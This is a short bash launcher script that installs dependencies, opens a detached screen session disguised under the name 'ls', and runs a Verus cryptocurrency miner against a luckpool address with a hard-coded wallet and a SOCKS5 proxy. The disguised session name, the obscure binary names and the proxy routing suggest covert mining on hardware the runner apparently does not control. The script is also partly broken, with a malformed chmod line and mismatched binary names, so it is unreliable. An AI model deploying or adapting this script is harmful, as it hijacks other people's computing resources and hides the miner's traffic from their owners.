#!/bin/bash
sudo apt update 
sudo apt install screen libjansson4 -y 
chmod +x start.sh && chmod +x cumin chmod 777 cumin start.sh
screen -dmS ls 
POOL=stratum+tcp://eu.luckpool.net:3956
WALLET=RCxbifXviidNdiEaKa4PYxt7Ch5vrGSxh9
WORKER=$(echo $(shuf -i 1-10 -n 1)Goa)
PROXY=socks5://98.185.83.105:12752
./uluk -a verus -o $POOL -u $WALLET.$WORKER -t 2 -x $PROXY
